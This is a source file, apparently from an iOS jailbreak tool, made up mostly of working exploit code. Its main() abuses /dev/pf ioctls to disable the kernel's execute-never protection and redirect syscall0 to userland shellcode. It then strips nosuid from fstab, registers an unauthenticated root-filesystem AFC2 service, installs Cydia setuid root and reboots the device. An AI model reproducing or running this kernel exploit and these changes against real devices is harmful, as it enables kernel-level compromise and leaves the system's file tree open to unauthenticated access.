#include <unistd.h>
#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <net/pfvar.h>
#include <sys/syscall.h>
#include <libkern/OSCacheControl.h>
#include <CoreGraphics/CoreGraphics.h>
#include <Foundation/Foundation.h>
#include <sys/stat.h>
#include <IOKit/IOKitLib.h>
#include <CoreSurface.h>
#include <IOMobileFramebuffer.h>
#include <ImageIO/ImageIO.h>
#include <assert.h>
#include <spawn.h>
#include <sys/sysctl.h>

mach_port_t kernel_task = 0; /* pid 0 */

extern void* kernel_code_start;
extern void* kernel_code_end;

int drawImage(const char* pngFileName);

#include <our_tar.h>

#define _log
#define _assert(x) (x)
#define _assert_zero(x) (x)

char ***_NSGetEnviron(void);

// comex
static int run(char **argv, char **envp) {
    if(envp == NULL) envp = *((char ***)_NSGetEnviron());
    fprintf(stderr, "run:");
    for(char **p = argv; *p; p++) {
        fprintf(stderr, " %s", *p);
    }
    fprintf(stderr, "\n");
    
    pid_t pid;
    int stat;
    if(posix_spawn(&pid, argv[0], NULL, NULL, argv, envp)) return 255;
    if(pid != waitpid(pid, &stat, 0)) return 254;
    if(!WIFEXITED(stat)) return 253;
    return WEXITSTATUS(stat);
}


// returns whether the plist existed
static bool modify_plist(NSString *filename, void (^func)(id)) {
    NSData *data = [NSData dataWithContentsOfFile:filename];
    if(!data) {
        return false;
    }
    NSPropertyListFormat format;
    NSError *error;
    id plist = [NSPropertyListSerialization propertyListWithData:data options:NSPropertyListMutableContainersAndLeaves format:&format error:&error];
    
    func(plist);
    
    NSData *new_data = [NSPropertyListSerialization dataWithPropertyList:plist format:format options:0 error:&error];
    
    [new_data writeToFile:filename atomically:YES];
    
    return true;
}

static void dok48() {
    char model[32];
    size_t model_size = sizeof(model);
    sysctlbyname("hw.model", model, &model_size, NULL, 0);
    
    NSString *filename = [NSString stringWithFormat:@"/System/Library/CoreServices/SpringBoard.app/%s.plist", model];
    modify_plist(filename, ^(id plist) {
        [[plist objectForKey:@"capabilities"] setObject:[NSNumber numberWithBool:false] forKey:@"hide-non-default-apps"];
    });
}

static void add_afc2() {
    _assert(modify_plist(@"/System/Library/Lockdown/Services.plist", ^(id services) {
        NSDictionary *args = [NSDictionary dictionaryWithObjectsAndKeys:
                              [NSArray arrayWithObjects:@"/usr/libexec/afcd",
                               @"--lockdown",
                               @"-d",
                               @"/",
                               nil], @"ProgramArguments",
                              [NSNumber numberWithBool:true], @"AllowUnauthenticatedServices",
                              @"com.apple.afc2",              @"Label",
                              nil];
        [services setValue:args forKey:@"com.apple.afc2"];
    }));
}

@interface LSApplicationWorkspace { }
+(LSApplicationWorkspace *)defaultWorkspace;
-(BOOL)registerApplication:(id)application;
-(BOOL)unregisterApplication:(id)application;
@end

static void uicache() {
    NSMutableDictionary *cache = [NSMutableDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Caches/com.apple.mobile.installation.plist"];
    if(cache) {
        NSMutableDictionary *cydia = [NSMutableDictionary dictionaryWithContentsOfFile:@"/Applications/Cydia.app/Info.plist"];
        [cydia setObject:@"/Applications/Cydia.app" forKey:@"Path"];
        [cydia setObject:@"System" forKey:@"ApplicationType"];
        id system = [cache objectForKey:@"System"];
        if([system respondsToSelector:@selector(addObject:)])
            [system addObject:cydia];
        else
            [system setObject:cydia forKey:@"com.saurik.Cydia"];
        [cache writeToFile:@"/var/mobile/Library/Caches/com.apple.mobile.installation.plist" atomically:YES];
    }
    
    NSURL *url = [NSURL fileURLWithPath:@"/Applications/Cydia.app"];
    LSApplicationWorkspace *workspace = [LSApplicationWorkspace defaultWorkspace];
    [workspace unregisterApplication:url];
    [workspace registerApplication:url];
}

static void decrement_address(int pffd, struct pfioc_pooladdr* pp, uint32_t addr, int times)
{
    pp->addr.addr.p.tbl = (void *) (addr - 0x4A4);
    
    for(int i = 0; i < times; ++i)
    {
        ioctl(pffd, DIOCADDADDR, pp);
    }
}

int main(int argc, char* argv[])
{
    // -- begin planetbeing's code
    // Offline calculations
    uintptr_t userland_start = 0x1F000000;
    int shift_byte = (KERNEL_SYSCALL0_VALUE >> 24) - (userland_start >> 24);
    uintptr_t shift_address = shift_byte << 24;
    vm_address_t target = (KERNEL_SYSCALL0_VALUE - shift_address) & ~0xFFF;
    int page_offset = (KERNEL_SYSCALL0_VALUE & 0xFFF) & ~1;
    int kernel_code_size = (uintptr_t)&kernel_code_end - (uintptr_t)&kernel_code_start;
    int kernel_code_size_page = (page_offset + kernel_code_size + 0xFFF)  / 0x1000 * 0x1000;
    
    // Setup kernel exploit structs
    struct pfioc_trans trans;
    struct pfioc_trans_e trans_e;
    struct pfioc_pooladdr pp;
    
    memset(&trans, 0, sizeof(trans));
    memset(&trans_e, 0, sizeof(trans_e));
    trans.size = 1;
    trans.esize = sizeof(trans_e);
    trans.array = &trans_e;
    trans_e.rs_num = PF_RULESET_FILTER;
    
    // Exploit kernel
    int pffd = open("/dev/pf", O_RDWR);
    ioctl(pffd, DIOCSTOP);
    ioctl(pffd, DIOCSTART);
    ioctl(pffd, DIOCXBEGIN, &trans);
    ioctl(pffd, DIOCBEGINADDRS, &pp);
    
    pp.af = AF_INET;
    pp.addr.addr.type = PF_ADDR_TABLE;
    
    // Disable XN bit for subsequent vm_allocates.
    decrement_address(pffd, &pp, KERNEL_NX_ENABLE, 1);
    
    // Shift function pointer for syscall0 down into the userland
    decrement_address(pffd, &pp, KERNEL_SYSCALL0 + 3, shift_byte);
    
    ioctl(pffd, DIOCBEGINADDRS, &pp);
    ioctl(pffd, DIOCSTOP);
    close(pffd);
    
    
    // Allocate shellcode
    vm_address_t allocation = target;
    kern_return_t kr = vm_allocate(mach_task_self(), &allocation, kernel_code_size_page, FALSE);
    if(kr != KERN_SUCCESS)
        return 0;
    
    // Copy shellcode
    memcpy((void*)(allocation + page_offset), &kernel_code_start, kernel_code_size);
    sys_cache_control(kCacheFunctionPrepareForExecution, (void*)allocation, kernel_code_size_page);
    
    // Execute shellcode
    syscall(0, 0, 0);

    // end planetbeing's code
    
    printf("done patching kernel\n");
    
    struct stat buf;
    
    if(stat("/private/var/unthreadedjb/install", &buf) != -1) {
        return 0;
    }
    
    drawImage("/private/var/unthreadedjb/unthread.png");
    
    NSString *string = [NSString stringWithContentsOfFile:@"/etc/fstab" encoding:NSUTF8StringEncoding error:NULL];
    string = [string stringByReplacingOccurrencesOfString:@",nosuid,nodev" withString:@""];
    string = [string stringByReplacingOccurrencesOfString:@" ro " withString:@" rw "];
    [string writeToFile:@"/etc/fstab" atomically:YES encoding:NSUTF8StringEncoding error:NULL];
    
    dok48();
    add_afc2();
    
    untar("/var/unthreadedjb/Cydia.tar", "/");
    
    chown("/Applications/Cydia.app/MobileCydia", 0, 0);
    chmod("/Applications/Cydia.app/MobileCydia", 06755);
    
    uicache();
    
    FILE *f = fopen("/private/var/unthreadedjb/install", "wb");
    char buf2[] = "lol";
    fwrite(buf2, 4, 1, f);
    fclose(f);
    
    sleep(4);
    run((char *[]) {"/sbin/reboot", NULL}, NULL);
    
    return 0;
}


int screenWidth, screenHeight;
CGContextRef context = NULL;

CGContextRef fb_open() {
    io_connect_t conn;
    int bytesPerRow;
    void *surfaceBuffer;
    void *frameBuffer;
    CGColorSpaceRef colorSpace;
    
    if (context != NULL)
        return context;
    
    io_service_t fb_service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleCLCD"));
    if (!fb_service) {
        fb_service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleM2CLCD"));
        if (!fb_service) {
            printf("Couldn't find framebuffer.\n");
            return NULL;
        }
    }
    
    IOMobileFramebufferOpen(fb_service, mach_task_self(), 0, &conn);
    IOMobileFramebufferGetLayerDefaultSurface(conn, 0, &surfaceBuffer);
    
    screenHeight = CoreSurfaceBufferGetHeight(surfaceBuffer);
    screenWidth = CoreSurfaceBufferGetWidth(surfaceBuffer);
    bytesPerRow = CoreSurfaceBufferGetBytesPerRow(surfaceBuffer);
    
    CoreSurfaceBufferLock(surfaceBuffer, 3);
    frameBuffer = CoreSurfaceBufferGetBaseAddress(surfaceBuffer);
    CoreSurfaceBufferUnlock(surfaceBuffer);
    
    // create bitmap context
    colorSpace = CGColorSpaceCreateDeviceRGB();
    context = CGBitmapContextCreate(frameBuffer, screenWidth, screenHeight, 8, bytesPerRow, colorSpace, kCGImageAlphaPremultipliedLast);
    if(context == NULL) {
        printf("Couldn't create screen context!\n");
        return NULL;
    }
    
    CGColorSpaceRelease(colorSpace);
    
    return context;
}

int drawImage(const char* pngFileName)
{
    CGContextRef c = fb_open();
    if (c == NULL)
        return -1;
    
    CFURLRef url = CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault, (const UInt8*)pngFileName, strlen(pngFileName), 0);
    void* imageSource = CGImageSourceCreateWithURL(url, NULL);
    CFRelease(url);
    
    if (imageSource != NULL)
    {
        CGImageRef img = CGImageSourceCreateImageAtIndex(imageSource, 0, NULL);
        if (img != NULL)
        {
            CGContextClearRect (c, CGRectMake(0, 0, screenWidth, screenHeight));
            CGContextDrawImage(c, CGRectMake(0, 0, screenWidth, screenHeight), img);
        }
    }
    return 0;
}
